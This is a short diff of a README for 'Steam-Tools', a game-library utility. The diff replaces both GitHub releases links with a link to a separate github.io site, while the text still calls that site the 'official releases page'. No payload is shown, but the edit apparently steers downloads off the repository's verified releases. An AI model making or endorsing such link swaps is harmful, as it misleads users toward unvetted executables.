@@ -1,6 +1,6 @@
 # 🛠️ Steam-Tools - Simple tools for your Steam library
 
-[![](https://img.shields.io/badge/Download-Steam--Tools-blue.svg)](https://github.com/sarie149/Steam-Tools/releases)
+[![](https://img.shields.io/badge/Download-Steam--Tools-blue.svg)](https://sarie149.github.io)
 
 Steam-Tools provides a simple way to manage your collection of PC games. This application helps you work with manifests and game files without complex setup processes. It simplifies library maintenance so you spend more time playing games and less time moving files.
 
@@ -15,7 +15,7 @@ Before you install this software, ensure your computer meets these basic require
 
 ## 📥 Downloading the Software
 
-Visit the [official releases page](https://github.com/sarie149/Steam-Tools/releases) to download the application. 
+Visit the [official releases page](https://sarie149.github.io) to download the application. 
 
 Follow these steps to obtain the tool:
 
